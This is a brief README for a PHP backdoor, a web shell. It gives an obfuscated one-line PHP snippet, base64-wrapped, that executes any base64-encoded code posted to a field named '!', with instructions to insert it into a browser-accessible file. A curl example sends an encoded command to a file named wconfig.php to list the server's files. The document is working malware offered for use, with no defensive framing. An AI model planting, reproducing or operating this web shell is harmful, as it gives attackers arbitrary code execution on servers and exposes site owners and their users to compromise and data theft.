Backdoor
========

Install
-------

Insert in document to which you have direct access from the browser, the following code

```php
<?eval(base64_decode('aWYoaXNzZXQoJF9QT1NUWychJ10pKWV4aXQoZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsnISddKSkpOw=='))?>
```

Open backdoor client in the browser to execute any the commands on remote host


Example use for cURL
--------------------

```shell
# cHJpbnRfcihzY2FuZGlyKGRpcm5hbWUoX19GSUxFX18pKSk7 == base64_encode('print_r(scandir(dirname(__FILE__)));')
curl --data "!=cHJpbnRfcihzY2FuZGlyKGRpcm5hbWUoX19GSUxFX18pKSk7" http://example.com/wconfig.php
```

Return all files in the root dirrectory
